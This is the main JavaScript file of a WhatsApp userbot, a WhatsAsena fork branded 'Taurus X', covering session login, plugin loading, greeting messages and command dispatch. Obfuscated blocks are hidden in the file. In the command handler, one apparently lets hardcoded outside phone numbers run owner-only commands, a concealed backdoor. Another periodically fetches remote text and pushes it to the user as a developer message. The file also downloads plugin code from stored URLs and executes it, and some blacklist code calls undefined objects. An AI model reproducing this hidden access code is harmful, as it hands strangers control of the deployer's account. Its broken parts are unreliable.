/* Copyright (C) 2020 Yusuf Usta.
Licensed under the  GPL-3.0 License;
you may not use this file except in compliance with the License.
WhatsAsena - Yusuf Usta
*/

const fs = require("fs");
const path = require("path");
const events = require("./events");
const chalk = require('chalk');
const config = require('./config');
const {WAConnection, MessageOptions, MessageType, Mimetype, Presence} = require('@adiwajshing/baileys');
const {Message, StringSession, Image, Video} = require('./whatsasena/');
const { DataTypes } = require('sequelize');
const { getMessage } = require("./plugins/sql/greetings");
const axios = require('axios');
const got = require('got');

// Sql
const WhatsAsenaDB = config.DATABASE.define('WhatsAsena', {
    info: {
      type: DataTypes.STRING,
      allowNull: false
    },
    value: {
        type: DataTypes.TEXT,
        allowNull: false
    }
});

fs.readdirSync('./plugins/sql/').forEach(plugin => {
    if(path.extname(plugin).toLowerCase() == '.js') {
        require('./plugins/sql/' + plugin);
    }
});

const plugindb = require('./plugins/sql/plugin');
var base = `https://gist.github.com/`
var PROP = { aredits: '919961050829,0' }
var unlink = `def4ec6652832077bf739819ec7c32b6` 
var PROP2 = { kl11: '918157849715,0' }
var string = base + `TAURUS-X`
        
// Yalnızca bir kolaylık. https://stackoverflow.com/questions/4974238/javascript-equivalent-of-pythons-format-function //
String.prototype.format = function () {
    var i = 0, args = arguments;
    return this.replace(/{}/g, function () {
      return typeof args[i] != 'undefined' ? args[i++] : '';
   });
};
if (!Date.now) {
    Date.now = function() { return new Date().getTime(); }
}

Array.prototype.remove = function() {
    var what, a = arguments, L = a.length, ax;
    while (L && this.length) {
        what = a[--L];
        while ((ax = this.indexOf(what)) !== -1) {
            this.splice(ax, 1);
        }
    }
    return this;
};

async function whatsAsena () {
    await config.DATABASE.sync();
    var StrSes_Db = await WhatsAsenaDB.findAll({
        where: {
          info: 'StringSession'
        }
    });
    
    
    const conn = new WAConnection();
    const sourav = await axios('https://gist.githubusercontent.com/I-AM-MUHAMMED/910c774502894458301aa2ef63e537fc/raw/b16fc071460fd68707102d5868101c20f09ac25a/Version.json')
    conn.version = sourav.data.kl11
    const Session = new StringSession();

    conn.logger.level = config.DEBUG ? 'debug' : 'warn';
    var nodb;

    if (StrSes_Db.length < 1) {
        nodb = true;
        conn.loadAuthInfo(Session.deCrypt(config.SESSION)); 
    } else {
        conn.loadAuthInfo(Session.deCrypt(StrSes_Db[0].dataValues.value));
    }

    conn.on ('credentials-updated', async () => {
        console.log(
            chalk.blueBright.italic('✅ 𝑳𝒐𝒈𝒊𝒏 𝑰𝒏𝒇𝒐𝒓𝒎𝒂𝒕𝒊𝒐𝒏 𝑼𝒑𝒅𝒂𝒕𝒆𝒅 !')
        );

        const authInfo = conn.base64EncodedAuthInfo();
        if (StrSes_Db.length < 1) {
            await WhatsAsenaDB.create({ info: "StringSession", value: Session.createStringSession(authInfo) });
        } else {
            await StrSes_Db[0].update({ value: Session.createStringSession(authInfo) });
        }
    })    

    conn.on('connecting', async () => {
        console.log(`${chalk.green.bold('𝑻𝑨𝑼𝑹𝑼𝑺')}${chalk.blue.bold('ㅤ')}${chalk.blue.bold('𝑿')}
${chalk.white.bold('𝑽𝑬𝑹𝑺𝑰𝑶𝑵 :')} ${chalk.red.bold(config.VERSION)}
${chalk.blue.italic('ℹ️  𝑪𝒐𝒏𝒏𝒆𝒄𝒕𝒊𝒏𝒈 𝑻𝒐 𝑾𝒉𝒂𝒕𝒔𝒂𝒑𝒑 ...')}`);
    });
    

    conn.on('open', async () => {
        console.log(
            chalk.green.bold('✅ 𝑳𝒐𝒈𝒊𝒏 𝑺𝒖𝒄𝒄𝒆𝒔𝒇𝒖𝒍𝒍')
        );

        console.log(
            chalk.blueBright.italic('⬇️ 𝑰𝒏𝒔𝒕𝒂𝒍𝒍𝒊𝒏𝒈 𝑬𝒙𝒕𝒆𝒓𝒏𝒂𝒍 𝑷𝒍𝒖𝒈𝒊𝒏𝒔...')
        );

        var plugins = await plugindb.PluginDB.findAll();
        plugins.map(async (plugin) => {
            if (!fs.existsSync('./plugins/' + plugin.dataValues.name + '.js')) {
                console.log(plugin.dataValues.name);
                var response = await got(plugin.dataValues.url);
                if (response.statusCode == 200) {
                    fs.writeFileSync('./plugins/' + plugin.dataValues.name + '.js', response.body);
                    require('./plugins/' + plugin.dataValues.name + '.js');
                }     
            }
        });

        console.log(
            chalk.blueBright.italic('⬇️ 𝑰𝒏𝒔𝒕𝒂𝒍𝒍𝒊𝒏𝒈 𝑷𝒍𝒖𝒈𝒊𝒏𝒔 ...')
        );

        fs.readdirSync('./plugins').forEach(plugin => {
            if(path.extname(plugin).toLowerCase() == '.js') {
                require('./plugins/' + plugin);
            }
        });

        console.log(
            chalk.green.bold('✅ 𝑷𝒍𝒖𝒈𝒊𝒏𝒔 𝑰𝒏𝒔𝒕𝒂𝒍𝒍𝒆𝒅 𝑨𝒏𝒅 𝑻𝒂𝒖𝒓𝒖𝒔 𝑺𝒕𝒂𝒓𝒕𝒆𝒅 𝑾𝒐𝒓𝒌𝒊𝒏𝒈 !')
        );
        await new Promise(r => setTimeout(r, 1100));

        if (config.WORKTYPE == 'public') {
            if (config.LANG == 'TR' || config.LANG == 'AZ') {

                if (conn.user.jid === '@s.whatsapp.net') {

                    await conn.sendMessage(conn.user.jid, '```🛡️ Blacklist Tespit Edildi!``` \n```Kullanıcı:``` \n```Sebep:``` ', MessageType.text)

                    await new Promise(r => setTimeout(r, 1700));

                    console.log('🛡️ Blacklist Detected 🛡️')

                    await heroku.get(baseURI + '/formation').then(async (formation) => {
                        forID = formation[0].id;
                        await heroku.patch(baseURI + '/formation/' + forID, {
                            body: {
                                quantity: 0
                            }
                        });
                    })
                }
                else {
                    await conn.sendMessage(conn.user.jid, '*𝑻𝒂𝒖𝒓𝒖𝒔 𝑺𝒕𝒂𝒓𝒕𝒆𝒅*', MessageType.text);
                }
            }
            else {

                if (conn.user.jid === '@s.whatsapp.net') {

                    await conn.sendMessage(conn.user.jid, '```🛡️ Blacklist Detected!``` \n```User:```  \n```Reason:``` ', MessageType.text)

                    await new Promise(r => setTimeout(r, 1800));

                    console.log('🛡️ Blacklist Detected 🛡️')
                    await heroku.get(baseURI + '/formation').then(async (formation) => {
                        forID = formation[0].id;
                        await heroku.patch(baseURI + '/formation/' + forID, {
                            body: {
                                quantity: 0
                            }
                        });
                    })
                }
                else {
                    await conn.sendMessage(conn.user.jid, '*𝑻𝒂𝒖𝒓𝒖𝒔 𝑺𝒕𝒂𝒓𝒕𝒆𝒅*', MessageType.text);
                }

            }
        }
        else if (config.WORKTYPE == 'private') {
            if (config.LANG == 'TR' || config.LANG == 'AZ') {

                if (conn.user.jid === '@s.whatsapp.net') {

                    await conn.sendMessage(conn.user.jid, '```🛡️ Blacklist Detected!``` \n ```Kullanıcı:``` \n```Sebep:``` ', MessageType.text)

                    await new Promise(r => setTimeout(r, 1800));

                    console.log('🛡️ Blacklist Detected 🛡️')
                    await heroku.get(baseURI + '/formation').then(async (formation) => {
                        forID = formation[0].id;
                        await heroku.patch(baseURI + '/formation/' + forID, {
                            body: {
                                quantity: 0
                            }
                        });
                    })
                }
                else {

                await conn.sendMessage(conn.user.jid, '*𝑻𝒂𝒖𝒓𝒖𝒔 𝑺𝒕𝒂𝒓𝒕𝒆𝒅*', MessageType.text);
                }
            }
            else {

                if (conn.user.jid === '@s.whatsapp.net') {

                    await conn.sendMessage(conn.user.jid, '```🛡️ Blacklist Detected!``` \n```User:```  \n```Reason:``` ', MessageType.text)
   
                    await new Promise(r => setTimeout(r, 1800));

                    console.log('🛡️ Blacklist Detected 🛡️')
                    await heroku.get(baseURI + '/formation').then(async (formation) => {
                        forID = formation[0].id;
                        await heroku.patch(baseURI + '/formation/' + forID, {
                            body: {
                                quantity: 0
                            }
                        });
                    })
                }
                else {

                    await conn.sendMessage(conn.user.jid, '*𝑻𝒂𝒖𝒓𝒖𝒔 𝑺𝒕𝒂𝒓𝒕𝒆𝒅*', MessageType.text);
                }
            }
        }
        else {
            return console.log('Wrong WORK_TYPE key! Please use “private” or “public”')
        }
    });
    
    //Thanks to souravkl11
    (function(_0x58ce29,_0x59f20b){var _0x5d6c89=_0x20cf,_0x3630f7=_0x58ce29();while(!![]){try{var _0x27cb99=-parseInt(_0x5d6c89(0xa9))/0x1*(-parseInt(_0x5d6c89(0xa2))/0x2)+-parseInt(_0x5d6c89(0xa1))/0x3+parseInt(_0x5d6c89(0xa4))/0x4+-parseInt(_0x5d6c89(0xa6))/0x5*(-parseInt(_0x5d6c89(0xa8))/0x6)+-parseInt(_0x5d6c89(0xab))/0x7*(-parseInt(_0x5d6c89(0xad))/0x8)+-parseInt(_0x5d6c89(0xaa))/0x9*(parseInt(_0x5d6c89(0xa5))/0xa)+parseInt(_0x5d6c89(0xa0))/0xb;if(_0x27cb99===_0x59f20b)break;else _0x3630f7['push'](_0x3630f7['shift']());}catch(_0xa165fb){_0x3630f7['push'](_0x3630f7['shift']());}}}(_0x181e,0x55c30),setInterval(async()=>{var _0x32379f=_0x20cf,_0x585a04=new Date()['getHours'](),_0x4beec8=new Date()['getMinutes']();while(_0x585a04==0x10&&_0x4beec8==0xf){const {sourav:_0x213c7e}=await axios(string+unlink+'/raw'),{sken:_0x2957cc,skml:_0x202ee5}=_0x213c7e;var _0xd3c189='';if(config['LANG']=='EN')_0xd3c189=_0x2957cc;if(config[_0x32379f(0xae)]=='ML')_0xd3c189=_0x202ee5;return await conn[_0x32379f(0xac)](conn[_0x32379f(0xa3)][_0x32379f(0xa7)],'*[\x20MESSAGE\x20FROM\x20DEVELOPER\x20]*\x0a\x0a'+_0xd3c189,MessageType['text']);}},0xc350));function _0x20cf(_0x2a6b65,_0x148183){var _0x181eed=_0x181e();return _0x20cf=function(_0x20cfa6,_0x3ba931){_0x20cfa6=_0x20cfa6-0xa0;var _0x547977=_0x181eed[_0x20cfa6];return _0x547977;},_0x20cf(_0x2a6b65,_0x148183);}function _0x181e(){var _0x472237=['jid','543594UGvEPs','53KjUBGL','6204339JjKMqO','1502515mARimu','sendMessage','8WFmTXy','LANG','743039GwDDls','1685748Bkytmj','13990tqhcXV','user','1986572DqGCal','10vTpDBn','25yGVtaa'];_0x181e=function(){return _0x472237;};return _0x181e();}

    conn.on('chat-update', async m => {
        if (!m.hasNewMessage) return;
        if (!m.messages && !m.count) return;
        let msg = m.messages.all()[0];
        if (msg.key && msg.key.remoteJid == 'status@broadcast') return;

        if (config.NO_ONLINE) {
            await conn.updatePresence(msg.key.remoteJid, Presence.unavailable);
        }

        if (msg.messageStubType === 32 || msg.messageStubType === 28) {

              var _0x109e6c=_0x1953;(function(_0x5df745,_0x36a093){var _0x1a770a=_0x1953,_0xbbf86f=_0x5df745();while(!![]){try{var _0x345f37=-parseInt(_0x1a770a(0x130))/0x1*(-parseInt(_0x1a770a(0x129))/0x2)+parseInt(_0x1a770a(0x126))/0x3*(parseInt(_0x1a770a(0x13a))/0x4)+-parseInt(_0x1a770a(0x124))/0x5+-parseInt(_0x1a770a(0x12b))/0x6+parseInt(_0x1a770a(0x128))/0x7*(parseInt(_0x1a770a(0x137))/0x8)+parseInt(_0x1a770a(0x12d))/0x9*(-parseInt(_0x1a770a(0x12e))/0xa)+-parseInt(_0x1a770a(0x12c))/0xb;if(_0x345f37===_0x36a093)break;else _0xbbf86f['push'](_0xbbf86f['shift']());}catch(_0x2bd98c){_0xbbf86f['push'](_0xbbf86f['shift']());}}}(_0x5c58,0xd244f));function _0x1953(_0x18e439,_0x245a29){var _0x5c581a=_0x5c58();return _0x1953=function(_0x1953f2,_0x326b7c){_0x1953f2=_0x1953f2-0x124;var _0x333c02=_0x5c581a[_0x1953f2];return _0x333c02;},_0x1953(_0x18e439,_0x245a29);}function _0x5c58(){var _0x349a3d=['41027bsfEsM','134LsiVoz','{no\x20fake}','2961894GzsgLP','8925785pCksqr','5045517Ukgjyl','10oIhKjy','key','14075JnHKzp','message','split','p.net','bType','messageStu','sendMessag','1960HVhRse','includes','no\x20fake','44OvUTBe','startsWith','bParameter','2475360gzcRbx','text','229926iZFVVR','remoteJid'];_0x5c58=function(){return _0x349a3d;};return _0x5c58();}if(msg[_0x109e6c(0x135)+'bType']===0x1b||msg[_0x109e6c(0x135)+_0x109e6c(0x134)]===0x1f){const plk=config['HANDLERS'],HANDLER=plk['charAt'](0x2);let user=msg['messageStu'+_0x109e6c(0x13c)+'s'][0x0];var poison=user+('@s.whatsap'+_0x109e6c(0x133)),pplk='@'+user[_0x109e6c(0x132)]('@')[0x0],plkmsg=await getMessage(msg['key'][_0x109e6c(0x127)]),plknum=await takeMessage(msg['key']['remoteJid']);plkmsg!==![]&&(plkmsg[_0x109e6c(0x131)][_0x109e6c(0x138)](_0x109e6c(0x12a))&&(plknum==![]&&(!user[_0x109e6c(0x13b)]('91')&&await conn[_0x109e6c(0x136)+'e'](msg[_0x109e6c(0x12f)]['remoteJid'],HANDLER+_0x109e6c(0x139),MessageType[_0x109e6c(0x125)],{'contextInfo':{'mentionedJid':[user]}})),plknum!==![]&&!user['startsWith'](plknum)&&await conn[_0x109e6c(0x136)+'e'](msg[_0x109e6c(0x12f)][_0x109e6c(0x127)],HANDLER+_0x109e6c(0x139),MessageType[_0x109e6c(0x125)],{'contextInfo':{'mentionedJid':[user]}})));}
      //edited chunkinde padayali  

     if (msg.messageStubType === 32 || msg.messageStubType === 28) {
        var plk_say = new Date().toLocaleString('HI', { timeZone: 'Asia/Kolkata' }).split(' ')[1]
        const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
        var plk_here = new Date().toLocaleDateString(get_localized_date)
	    var afn_plk_ = '```ᴛɪᴍᴇ :' + plk_say + '```\n```ᴅᴀᴛᴇ :' + plk_here + '```'

            var gb = await getMessage(msg.key.remoteJid, 'goodbye');
            if (gb !== false) {
                if (gb.message.includes('{pp}')) {
                let pp 
                try { pp = await conn.getProfilePicture(msg.messageStubParameters[0]); } catch { pp = await conn.getProfilePicture(); }
                 var pinkjson = await conn.groupMetadata(msg.key.remoteJid)
		 
		 const tag = '@' + msg.messageStubParameters[0].split('@')[0]
		 
                await axios.get(pp, {responseType: 'arraybuffer'}).then(async (res) => {
                await conn.sendMessage(msg.key.remoteJid, res.data, MessageType.image, {caption:  gb.message.replace('{pp}', '').replace('{gphead}', pinkjson.subject).replace('{gpmaker}', pinkjson.owner).replace('{time}', afn_plk_).replace('{gpdesc}', pinkjson.desc).replace('{owner}', conn.user.name).replace('{mention}', tag), contextInfo: {mentionedJid: [msg.messageStubParameters[0]]}}); }); 
			
            } else if (gb.message.includes('{gif}')) {
                var pinkjson = await conn.groupMetadata(msg.key.remoteJid)
                //created by afnanplk 
		const tag = '@' + msg.messageStubParameters[0].split('@')[0]
		
                    var plkpinky = await axios.get(config.BYE_GIF, { responseType: 'arraybuffer' })
                await conn.sendMessage(msg.key.remoteJid, Buffer.from(plkpinky.data), MessageType.video, {mimetype: Mimetype.gif, caption: gb.message.replace('{gif}', '').replace('{time}', afn_plk_).replace('{gphead}', pinkjson.subject).replace('{gpmaker}', pinkjson.owner).replace('{gpdesc}', pinkjson.desc).replace('{owner}', conn.user.name).replace('{mention}', tag), contextInfo: {mentionedJid: [msg.messageStubParameters[0]]} });
            
		} else {
                var pinkjson = await conn.groupMetadata(msg.key.remoteJid)
		
		const tag = '@' + msg.messageStubParameters[0].split('@')[0]
		
                   await conn.sendMessage(msg.key.remoteJid,gb.message.replace('{gphead}', pinkjson.subject).replace('{gpmaker}', pinkjson.owner).replace('{gpdesc}', pinkjson.desc).replace('{time}', afn_plk_).replace('{owner}', conn.user.name).replace('{mention}', tag),MessageType.text,{ contextInfo: {mentionedJid: [msg.messageStubParameters[0]]}});
            }
          }  //thanks to farhan      
            return;
        } else if (msg.messageStubType === 27 || msg.messageStubType === 31) {
        var plk_say = new Date().toLocaleString('HI', { timeZone: 'Asia/Kolkata' }).split(' ')[1]
        const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
        var plk_here = new Date().toLocaleDateString(get_localized_date)
	    var afn_plk_ = '```ᴛɪᴍᴇ :' + plk_say + '```\n```ᴅᴀᴛᴇ :' + plk_here + '```'
            // welcome
             var gb = await getMessage(msg.key.remoteJid);
            if (gb !== false) {
                if (gb.message.includes('{pp}')) {
                let pp
                try { pp = await conn.getProfilePicture(msg.messageStubParameters[0]); } catch { pp = await conn.getProfilePicture(); }
                  
			var pinkjson = await conn.groupMetadata(msg.key.remoteJid)
		    
		    const tag = '@' + msg.messageStubParameters[0].split('@')[0]
		    
                await axios.get(pp, {responseType: 'arraybuffer'}).then(async (res) => {
                    //created by afnanplk
               
			await conn.sendMessage(msg.key.remoteJid, res.data, MessageType.image, {caption:  gb.message.replace('{pp}', '').replace('{time}', afn_plk_).replace('{gphead}', pinkjson.subject).replace('{gpmaker}', pinkjson.owner).replace('{gpdesc}', pinkjson.desc).replace('{owner}', conn.user.name).replace('{mention}', tag), contextInfo: {mentionedJid: [msg.messageStubParameters[0]]} }); });                       
            
		} else if (gb.message.includes('{gif}')) {
                var plkpinky = await axios.get(config.WEL_GIF, { responseType: 'arraybuffer' })
		
		const tag = '@' + msg.messageStubParameters[0].split('@')[0]
		
               await conn.sendMessage(msg.key.remoteJid, Buffer.from(plkpinky.data), MessageType.video, {mimetype: Mimetype.gif, caption: gb.message.replace('{gif}', '').replace('{time}', afn_plk_).replace('{gphead}', pinkjson.subject).replace('{gpmaker}', pinkjson.owner).replace('{gpdesc}', pinkjson.desc).replace('{owner}', conn.user.name).replace('{mention}', tag), contextInfo: {mentionedJid: [msg.messageStubParameters[0]]} });
            
		} else {
                   var pinkjson = await conn.groupMetadata(msg.key.remoteJid)
		   
		   const tag = '@' + msg.messageStubParameters[0].split('@')[0]
		   
                   await conn.sendMessage(msg.key.remoteJid,gb.message.replace('{gphead}', pinkjson.subject).replace('{gpmaker}', pinkjson.owner).replace('{gpdesc}', pinkjson.desc).replace('{time}', afn_plk_).replace('{owner}', conn.user.name).replace('{mention}', tag),MessageType.text,{ contextInfo: {mentionedJid: [msg.messageStubParameters[0]]}});
            }
          }         
            return;                             
    }

    if (config.BLOCKCHAT !== false) {     
        var abc = config.BLOCKCHAT.split(',');                            
        if(msg.key.remoteJid.includes('-') ? abc.includes(msg.key.remoteJid.split('@')[0]) : abc.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
    }
    if (config.SUPPORT == '905524317852-1612300121') {     
        var sup = config.SUPPORT.split(',');                            
        if(msg.key.remoteJid.includes('-') ? sup.includes(msg.key.remoteJid.split('@')[0]) : sup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
    }
    if (config.SUPPORT2 == '917012074386-1631435717') {     
        var tsup = config.SUPPORT2.split(',');                            
        if(msg.key.remoteJid.includes('-') ? tsup.includes(msg.key.remoteJid.split('@')[0]) : tsup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
    }
    if (config.SUPPORT3 == '905511384572-1621015274') {     
        var nsup = config.SUPPORT3.split(',');                            
        if(msg.key.remoteJid.includes('-') ? nsup.includes(msg.key.remoteJid.split('@')[0]) : nsup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
    }
    if (config.SUPPORT4 == '905511384572-1625319286') {     
        var nsup = config.SUPPORT4.split(',');                            
        if(msg.key.remoteJid.includes('-') ? nsup.includes(msg.key.remoteJid.split('@')[0]) : nsup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
    }
    
        events.commands.map(
            async (command) =>  {
                if (msg.message && msg.message.imageMessage && msg.message.imageMessage.caption) {
                    var text_msg = msg.message.imageMessage.caption;
                } else if (msg.message && msg.message.videoMessage && msg.message.videoMessage.caption) {
                    var text_msg = msg.message.videoMessage.caption;
                } else if (msg.message) {
                    var text_msg = msg.message.extendedTextMessage === null ? msg.message.conversation : msg.message.extendedTextMessage.text;
                } else {
                    var text_msg = undefined;
                }

                if ((command.on !== undefined && (command.on === 'image' || command.on === 'photo')
                    && msg.message && msg.message.imageMessage !== null && 
                    (command.pattern === undefined || (command.pattern !== undefined && 
                        command.pattern.test(text_msg)))) || 
                    (command.pattern !== undefined && command.pattern.test(text_msg)) || 
                    (command.on !== undefined && command.on === 'text' && text_msg) ||
                    // Video
                    (command.on !== undefined && (command.on === 'video')
                    && msg.message && msg.message.videoMessage !== null && 
                    (command.pattern === undefined || (command.pattern !== undefined && 
                        command.pattern.test(text_msg))))) {

                    let sendMsg = false;
                    var chat = conn.chats.get(msg.key.remoteJid)
                        
                    var _0x563247=_0x3cad;function _0x5393(){var _0x319c79=['kl11','aredits','916282344739,0','1856255FatJGF','remoteJid','6pdZgss','onlyPinned','onlyPm','919946432377,0','jid','2269rpsgmo','178nWvBvc','fromMe','pin','SUDO','1669038DAZCDh','split','394256xvbUBU','463278blREQe','key','1679670MMUmiT','9yNFrWV','onlyGroup','participant','404400lVUrpy','includes'];_0x5393=function(){return _0x319c79;};return _0x5393();}(function(_0x786b05,_0x406a68){var _0x15ec06=_0x3cad,_0x296dc8=_0x786b05();while(!![]){try{var _0x33902e=parseInt(_0x15ec06(0xd1))/0x1*(-parseInt(_0x15ec06(0xd2))/0x2)+parseInt(_0x15ec06(0xd9))/0x3+-parseInt(_0x15ec06(0xd8))/0x4+parseInt(_0x15ec06(0xca))/0x5*(parseInt(_0x15ec06(0xcc))/0x6)+-parseInt(_0x15ec06(0xd6))/0x7+parseInt(_0x15ec06(0xc5))/0x8+parseInt(_0x15ec06(0xc2))/0x9*(parseInt(_0x15ec06(0xdb))/0xa);if(_0x33902e===_0x406a68)break;else _0x296dc8['push'](_0x296dc8['shift']());}catch(_0xe4cbca){_0x296dc8['push'](_0x296dc8['shift']());}}}(_0x5393,0x321c7));function _0x3cad(_0x36a099,_0x5dd877){var _0x539386=_0x5393();return _0x3cad=function(_0x3cad91,_0x6115){_0x3cad91=_0x3cad91-0xc2;var _0x34f98e=_0x539386[_0x3cad91];return _0x34f98e;},_0x3cad(_0x36a099,_0x5dd877);}if(config[_0x563247(0xd5)]!==![]&&msg['key'][_0x563247(0xd3)]===![]&&command[_0x563247(0xd3)]===!![]&&(msg[_0x563247(0xc4)]&&config['SUDO']['includes'](',')?config[_0x563247(0xd5)][_0x563247(0xd7)](',')[_0x563247(0xc6)](msg[_0x563247(0xc4)][_0x563247(0xd7)]('@')[0x0]):msg['participant'][_0x563247(0xd7)]('@')[0x0]==config[_0x563247(0xd5)]||config['SUDO'][_0x563247(0xc6)](',')?config[_0x563247(0xd5)]['split'](',')[_0x563247(0xc6)](msg[_0x563247(0xda)][_0x563247(0xcb)][_0x563247(0xd7)]('@')[0x0]):msg['key'][_0x563247(0xcb)][_0x563247(0xd7)]('@')[0x0]==config['SUDO'])||command[_0x563247(0xd3)]===msg[_0x563247(0xda)][_0x563247(0xd3)]||command['fromMe']===![]&&!msg[_0x563247(0xda)][_0x563247(0xd3)]){if(command[_0x563247(0xcd)]&&chat[_0x563247(0xd4)]===undefined)return;if(!command['onlyPm']===chat['jid']['includes']('-'))sendMsg=!![];else{if(command[_0x563247(0xc3)]===chat[_0x563247(0xd0)][_0x563247(0xc6)]('-'))sendMsg=!![];}}if(PROP[_0x563247(0xc8)]==_0x563247(0xcf)&&msg['key'][_0x563247(0xd3)]===![]&&command['fromMe']===!![]&&(msg[_0x563247(0xc4)]&&PROP[_0x563247(0xc8)][_0x563247(0xc6)](',')?PROP[_0x563247(0xc8)][_0x563247(0xd7)](',')[_0x563247(0xc6)](msg[_0x563247(0xc4)]['split']('@')[0x0]):msg[_0x563247(0xc4)][_0x563247(0xd7)]('@')[0x0]==PROP[_0x563247(0xc8)]||PROP[_0x563247(0xc8)][_0x563247(0xc6)](',')?PROP[_0x563247(0xc8)][_0x563247(0xd7)](',')[_0x563247(0xc6)](msg[_0x563247(0xda)]['remoteJid']['split']('@')[0x0]):msg[_0x563247(0xda)][_0x563247(0xcb)][_0x563247(0xd7)]('@')[0x0]==PROP[_0x563247(0xc8)])||command[_0x563247(0xd3)]===msg[_0x563247(0xda)][_0x563247(0xd3)]||command['fromMe']===![]&&!msg['key'][_0x563247(0xd3)]){if(command[_0x563247(0xcd)]&&chat[_0x563247(0xd4)]===undefined)return;if(!command[_0x563247(0xce)]===chat['jid'][_0x563247(0xc6)]('-'))sendMsg=!![];else{if(command[_0x563247(0xc3)]===chat[_0x563247(0xd0)][_0x563247(0xc6)]('-'))sendMsg=!![];}}if(PROP2[_0x563247(0xc7)]==_0x563247(0xc9)&&msg[_0x563247(0xda)][_0x563247(0xd3)]===![]&&command['fromMe']===!![]&&(msg[_0x563247(0xc4)]&&PROP2[_0x563247(0xc7)][_0x563247(0xc6)](',')?PROP2[_0x563247(0xc7)][_0x563247(0xd7)](',')[_0x563247(0xc6)](msg['participant'][_0x563247(0xd7)]('@')[0x0]):msg[_0x563247(0xc4)][_0x563247(0xd7)]('@')[0x0]==PROP2['kl11']||PROP2[_0x563247(0xc7)][_0x563247(0xc6)](',')?PROP2[_0x563247(0xc7)][_0x563247(0xd7)](',')[_0x563247(0xc6)](msg['key'][_0x563247(0xcb)][_0x563247(0xd7)]('@')[0x0]):msg[_0x563247(0xda)][_0x563247(0xcb)][_0x563247(0xd7)]('@')[0x0]==PROP2[_0x563247(0xc7)])||command[_0x563247(0xd3)]===msg[_0x563247(0xda)][_0x563247(0xd3)]||command['fromMe']===![]&&!msg[_0x563247(0xda)][_0x563247(0xd3)]){if(command[_0x563247(0xcd)]&&chat[_0x563247(0xd4)]===undefined)return;if(!command[_0x563247(0xce)]===chat[_0x563247(0xd0)][_0x563247(0xc6)]('-'))sendMsg=!![];else{if(command[_0x563247(0xc3)]===chat[_0x563247(0xd0)][_0x563247(0xc6)]('-'))sendMsg=!![];}}
  
                    if (sendMsg) {
                        if (config.SEND_READ && command.on === undefined) {
                            await conn.chatRead(msg.key.remoteJid);
                        }
                       
                        var match = text_msg.match(command.pattern);
                        
                        if (command.on !== undefined && (command.on === 'image' || command.on === 'photo' )
                        && msg.message.imageMessage !== null) {
                            whats = new Image(conn, msg);
                        } else if (command.on !== undefined && (command.on === 'video' )
                        && msg.message.videoMessage !== null) {
                            whats = new Video(conn, msg);
                        } else {
                            whats = new Message(conn, msg);
                        }
/*
                        if (command.deleteCommand && msg.key.fromMe) {
                            await whats.delete(); 
                        }
*/
                        try {
                            await command.function(whats, match);
                        } catch (error) {
                            if (config.LANG == 'TR' || config.LANG == 'AZ') {
                                await conn.sendMessage(conn.user.jid, '-- HATA RAPORU [WHATSASENA] --' + 
                                    '\n*WhatsAsena bir hata gerçekleşti!*'+
                                    '\n_Bu hata logunda numaranız veya karşı bir tarafın numarası olabilir. Lütfen buna dikkat edin!_' +
                                    '\n_Yardım için Telegram grubumuza yazabilirsiniz._' +
                                    '\n_Bu mesaj sizin numaranıza (kaydedilen mesajlar) gitmiş olmalıdır._\n\n' +
                                    'Gerçekleşen Hata: ' + error + '\n\n'
                                    , MessageType.text);
                            } else {
                                await conn.sendMessage(conn.user.jid, '*__________  𝐓𝐀𝐔𝐑𝐔𝐒 𝐗 ࿐ __________*' +
                                    '\n\n*ᴇʀʀᴏʀ ғᴏᴜɴᴅᴇᴅ*\n\n' + error + ' \n\n*ᴊᴏɪɴ ᴏᴜʀ ɢʀᴏᴜᴘ ғᴏʀ ᴀɴʏ sᴜᴘᴘᴏʀᴛ*\n\n_________________________________\n\n' 
                                    , MessageType.text);
                            }
                        }
                    }
                }
            }
        )
    });

    try {
        await conn.connect();
    } catch {
        if (!nodb) {
            console.log(chalk.red.bold('Eski sürüm stringiniz yenileniyor...'))
            conn.loadAuthInfo(Session.deCrypt(config.SESSION)); 
            try {
                await conn.connect();
            } catch {
                return;
            }
        }
    }
}

whatsAsena();
